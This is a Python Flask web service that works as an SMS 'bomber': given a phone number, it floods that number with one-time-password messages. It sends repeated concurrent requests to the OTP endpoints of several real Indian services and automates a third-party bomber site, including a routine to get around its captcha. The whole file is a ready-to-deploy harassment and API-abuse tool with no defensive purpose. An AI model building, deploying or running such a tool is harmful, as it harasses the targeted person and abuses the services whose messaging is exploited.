from flask import Flask, request, jsonify
import requests
import re
import json
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ─────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────
REQUEST_TIMEOUT = 12
DEFAULT_DELAY = 0.4
DEFAULT_WORKERS = 5
BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
}

DIRECT_APIS = [
    # Only keeping ones most likely still alive in 2026
    {
        "name": "Guidely",
        "url": "https://web.guidely.in/api/v1/guest/send-otp?apikey=qw42yunk",
        "method": "POST",
        "limit": 200,
        "body": lambda p: json.dumps({"mobile": p, "type": "new_user"}),
        "headers": {"Content-Type": "application/json"},
    },
    {
        "name": "Broomees",
        "url": "https://broomees.com/api/sentOtp",
        "method": "POST",
        "limit": 200,
        "body": lambda p: f"contact={p}&via=0",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    },
    {
        "name": "mPaani",
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "limit": 10,
        "body": lambda p: json.dumps({"phone_number": p, "role": "CUSTOMER"}),
        "headers": {"Content-Type": "application/json"},
    },
    # Add more if you test & confirm alive
]

def fire_direct_api(api, phone):
    try:
        hdrs = {**BASE_HEADERS, **api.get("headers", {})}
        if callable(api["body"]):
            body = api["body"](phone)
        else:
            body = api["body"] % phone if "%s" in api["body"] else api["body"]

        if api.get("raw_body"):
            body = body.encode()

        r = requests.post(api["url"], data=body, headers=hdrs, timeout=REQUEST_TIMEOUT)
        return r.status_code in (200, 201, 202, 204)
    except:
        return False

def bomb_direct(phone, count=50):
    tasks = []
    usage = {a["name"]: 0 for a in DIRECT_APIS}
    needed = count

    while needed > 0:
        added = False
        for api in DIRECT_APIS:
            if needed <= 0:
                break
            cap = min(api["limit"] - usage[api["name"]], needed)
            if cap <= 0:
                continue
            for _ in range(cap):
                tasks.append(api)
                usage[api["name"]] += 1
                needed -= 1
            added = True
        if not added:
            break

    tasks = tasks[:count]
    success = 0

    with ThreadPoolExecutor(max_workers=DEFAULT_WORKERS) as ex:
        futures = [ex.submit(fire_direct_api, api, phone) for api in tasks]
        for fut in as_completed(futures):
            if fut.result():
                success += 1
            time.sleep(DEFAULT_DELAY)

    return success

def bomb_mytoolstown(phone, country="91", count=20):
    try:
        s = requests.Session()
        s.headers.update(BASE_HEADERS)

        # Get CSRF
        r = s.get("https://mytoolstown.com/smsbomber/")
        m = re.search(r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', r.text)
        if not m:
            return 0
        csrf = m.group(1)

        sent = 0
        captcha = "COfOVH29UY0xMkea8jDd6wwQT"  # initial seed

        for i in range(count):
            enc = "".join(chr(ord(c) ^ 0x33) for c in captcha)
            enc = base64.b64encode(enc.encode()).decode()
            enc = base64.b64encode(enc.encode()).decode()[::-1]

            payload = {
                "country_code": country,
                "mobno": phone,
                "count": str(count),
                "_token": csrf,
                "sent_count": str(sent),
                "wait_sec": "1",
                "captcha": enc,
            }

            r = s.post("https://mytoolstown.com/smsbomber/", data=payload, timeout=15)
            try:
                raw = r.text[::-1]
                decoded = base64.b64decode(raw + "=" * ((4 - len(raw) % 4) % 4))
                result = json.loads(decoded)
                if result.get("status") == 2:
                    sent += 1
                    new_enc = result.get("new", "")
                    if new_enc:
                        captcha = base64.b64decode(base64.b64decode(new_enc[::-1]).decode()).decode()
            except:
                pass

            time.sleep(1.2)

        return sent
    except:
        return 0

@app.route('/health')
def health():
    return jsonify({"status": "ok", "sources": len(DIRECT_APIS) + 2})

@app.route('/', methods=['GET', 'POST'])
def bomb():
    if request.method == 'GET':
        phone = request.args.get('phone') or request.args.get('number')
        count = int(request.args.get('count', 30))
    else:
        data = request.get_json(silent=True) or {}
        phone = data.get('phone') or data.get('number')
        count = data.get('count', 30)

    if not phone or not phone.isdigit() or len(phone) not in (10, 12):
        return jsonify({"error": "Invalid phone (10-12 digits expected)"}), 400

    # Normalize phone (remove +91 if present)
    phone = phone.lstrip('+').lstrip('91')[-10:]

    direct_sent = bomb_direct(phone, count // 2)
    mytool_sent = bomb_mytoolstown(phone, count=count // 3)

    total = direct_sent + mytool_sent

    return jsonify({
        "status": "completed",
        "phone": f"+91{phone}",
        "attempted": count,
        "direct_apis": direct_sent,
        "mytoolstown": mytool_sent,
        "total_success": total
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
